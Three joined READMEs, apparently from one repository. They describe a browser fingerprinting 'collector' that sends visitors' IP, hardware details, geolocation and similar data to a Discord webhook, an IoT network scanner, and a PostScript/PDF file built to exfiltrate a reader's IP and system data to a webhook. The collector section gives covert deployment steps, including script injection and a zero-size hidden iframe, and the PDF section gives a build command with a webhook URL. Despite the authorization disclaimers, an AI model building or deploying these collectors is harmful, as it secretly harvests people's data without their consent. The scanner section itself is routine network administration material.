# Browser Information Collection Tools

**IMPORTANT: These tools are for security testing, educational purposes, and authorized penetration testing ONLY. Do not use these tools without explicit permission from the target system owners or users.**

This repository contains scripts for analyzing what information browsers expose to websites. These tools demonstrate potential security and privacy concerns in web browsers.

## Files Included

1. `info_collector.html` - Interactive HTML page with a button to trigger data collection
2. `autoexec_collector.html` - Automatically collects data when the page loads with no user interaction
3. `minimal_collector.js` - Standalone JavaScript file that can be included in any webpage

## Usage Instructions

### For Testing Your Own Systems

1. Clone this repository
2. Create a Discord webhook for receiving the collected data
3. Replace `YOUR_WEBHOOK_URL` in each file with your actual Discord webhook URL
4. Host these files on a web server or open them locally in a browser

### For Authorized Penetration Testing

#### Method 1: Full Page Replace
Host the `autoexec_collector.html` file and direct users to it. It automatically collects and sends information.

#### Method 2: Script Injection
Include the `minimal_collector.js` script in a webpage:

```html
<script src="path/to/minimal_collector.js"></script>
```

#### Method 3: Iframe Embedding
Embed the auto-executing collector in an iframe:

```html
<iframe src="path/to/autoexec_collector.html" style="width:0;height:0;border:0;border:none;position:absolute;"></iframe>
```

## Security Considerations

These scripts demonstrate several browser information leakage vectors:

- IP address collection
- Browser and OS fingerprinting
- Screen resolution and color depth
- Timezone and language settings
- Hardware information (CPU cores, memory)
- Graphics hardware details
- Canvas and audio fingerprinting
- Cookie and storage availability
- Geolocation data (requires permission)
- Browser history length
- Network information
- Battery status
- Installed plugins

## Ethical Usage Guidelines

1. Always obtain proper authorization before using these tools
2. Only use these tools on systems you own or have explicit permission to test
3. Respect privacy and inform users if collecting their data
4. Securely handle and promptly delete any collected data
5. Do not use these tools for tracking without explicit consent

## Discord Webhook Setup

1. Create a Discord server (or use an existing one)
2. Go to Server Settings > Integrations > Webhooks
3. Create a new webhook, give it a name, and copy the URL
4. Replace the placeholder URL in the scripts with your webhook URL

## Disclaimer

The author(s) of these tools are not responsible for any misuse or legal consequences resulting from the improper use of these scripts. These tools are provided for educational and authorized security testing purposes only.

# IoT Network Scanner

A comprehensive Python tool for scanning local networks to identify, categorize, and document IoT devices.

## Features

- Automatically discovers all devices on your local network using ARP scanning
- Identifies IoT devices based on vendor, hostname, and open ports
- Categorizes devices into types (cameras, smart speakers, TVs, etc.)
- Collects detailed information including MAC address, IP, vendor, and open ports
- Saves results to a formatted text file and JSON format
- Option to filter out non-IoT/unknown devices

## Installation

1. Clone this repository:
   ```
   git clone https://github.com/yourusername/iot-network-scanner.git
   cd iot-network-scanner
   ```

2. Install required dependencies:
   ```
   pip install scapy python-nmap netifaces mac-vendor-lookup requests
   ```

3. Install nmap if not already installed:
   - On Debian/Ubuntu: `sudo apt install nmap`
   - On MacOS: `brew install nmap`
   - On Windows: Download from [nmap.org](https://nmap.org/download.html)

## Usage

The scanner requires root/administrator privileges to perform network scanning:

```
sudo python3 network_iot_scanner.py [options]
```

### Command Line Options

- `-i, --interface`: Specify the network interface to use for scanning
- `-o, --output`: Specify the output file name (default: iot_scan_YYYYMMDD_HHMMSS.txt)
- `-t, --timeout`: Set the timeout for ARP scanning in seconds (default: 5)
- `-v, --verbose`: Enable verbose output for detailed scanning information
- `-rmu, --rmu`: Remove unknown devices from results (only show identified IoT devices)

### Examples

Basic scan using default settings:
```
sudo python3 network_iot_scanner.py
```

Scan with verbose output and remove unknown devices:
```
sudo python3 network_iot_scanner.py -v -rmu
```

Specify interface and output file:
```
sudo python3 network_iot_scanner.py -i eth0 -o my_iot_devices.txt
```

Increase scan timeout for larger networks:
```
sudo python3 network_iot_scanner.py -t 10
```

## Output Format

The script generates both a human-readable text file and a JSON file containing all discovered information:

1. Text file includes:
   - Scan date and time
   - Total devices found
   - Devices grouped by type
   - Details for each device including IP, MAC, vendor, hostname, and open ports

2. JSON file includes:
   - Complete structured data for all devices
   - Can be used for further processing or integration with other tools

## Device Types

The scanner can identify the following types of IoT devices:
- Cameras
- Smart speakers
- Smart TVs and streaming devices
- Hubs and gateways
- Thermostats
- Smart doorbells
- Smart locks
- Smart lights
- Smart plugs and switches
- Smart appliances
- Robot vacuums
- Health and fitness devices

## Security Considerations

This tool is intended for:
- Network administrators managing IoT devices
- Security researchers performing authorized penetration testing
- Personal use on networks you own or have permission to scan

**Please use responsibly and only scan networks you have permission to test.**

## Contributing

Contributions are welcome! Please feel free to submit a pull request or open an issue.

## License

MIT License - See LICENSE file for details.

# PDF IP Collection Demo - Security Testing Tool

This project demonstrates a potential security vulnerability in PDF documents that could allow for IP address collection and data exfiltration to a remote server (Discord webhook). It serves as an educational tool for security professionals to understand how malicious PDFs might operate.

**⚠️ IMPORTANT: This tool is for EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY ⚠️**

## Overview

The project consists of two main components:

1. **ip_collector.ps** - A PostScript file that attempts to collect the user's IP address and system information, then send it to a Discord webhook.
2. **convert_to_pdf.py** - A Python script that converts the PostScript file to a PDF document.

Modern PDF readers implement security controls that should prevent the malicious behaviors demonstrated in this project. This tool helps security professionals test if their PDF reader implementations properly block these actions.

## Required Dependencies

- Python 3.6+
- Ghostscript (for PS to PDF conversion)

### Installing Ghostscript

- **Ubuntu/Debian**: `sudo apt install ghostscript`
- **macOS**: `brew install ghostscript`
- **Windows**: Download from [https://www.ghostscript.com/download/gsdnld.html](https://www.ghostscript.com/download/gsdnld.html)

## Usage

### 1. Setting Up a Discord Webhook (For Testing)

1. Create a Discord server (or use an existing one you own)
2. Go to Server Settings > Integrations > Webhooks
3. Create a new webhook and copy the webhook URL

### 2. Converting PostScript to PDF

Use the provided Python script to convert the PostScript file to a PDF:

```bash
python convert_to_pdf.py ip_collector.ps -w YOUR_WEBHOOK_URL -o output.pdf
```

Arguments:
- `-w`, `--webhook`: Discord webhook URL (optional)
- `-o`, `--output`: Output PDF filename (optional)

Example:
```bash
python convert_to_pdf.py ip_collector.ps -w https://discord.com/api/webhooks/123456789/abcdefg -o test_document.pdf
```

If you don't specify a webhook URL, the script will use a placeholder that won't work.

## How It Works

1. The PostScript file attempts to collect system information, including:
   - IP address (using various methods)
   - System time
   - PDF reader information

2. It then attempts to send this information to a Discord webhook via HTTP request.

3. Modern PDF readers should block these activities by default, preventing:
   - Execution of system commands
   - Network access
   - Access to system information

## Security Considerations

This tool demonstrates several security concerns:

1. **Document-based Data Collection**: The ability of document formats like PostScript/PDF to potentially collect user information.

2. **Data Exfiltration**: How collected data might be transmitted to external servers without user consent.

3. **Code Execution**: The ability to execute potentially harmful code within a document.

Most modern PDF readers implement security measures that prevent these actions. When viewing the generated PDF, you should see the document content but the data collection and transmission attempts should be blocked.

## IoT Security Testing

This project complements other security testing tools such as the IoT Network Scanner in this repository. When conducting security assessments, it's important to understand both network-level vulnerabilities and application/document-level risks.

## Legal and Ethical Disclaimer

This tool is provided for educational purposes and authorized security testing only. Unauthorized use of this tool to collect information from users without their explicit consent may violate privacy laws and computer crime legislation.

By using this tool, you agree:

1. To only use it on systems you own or have explicit permission to test
2. To use it solely for legitimate security research and education
3. Not to use it for malicious purposes or unauthorized data collection
4. To comply with all applicable laws and regulations

The author(s) take no responsibility for misuse or legal consequences resulting from improper use of this tool.

## References

- [SISA InfoSec: Types of Security Testing Techniques](https://www.sisainfosec.com/blogs/10-types-of-security-testing-techniques/)
- [OWASP PDF Security Testing Guide](https://owasp.org/www-community/attacks/PDF_Injection)
- [Ghostscript Documentation](https://www.ghostscript.com/documentation.html) # test_code
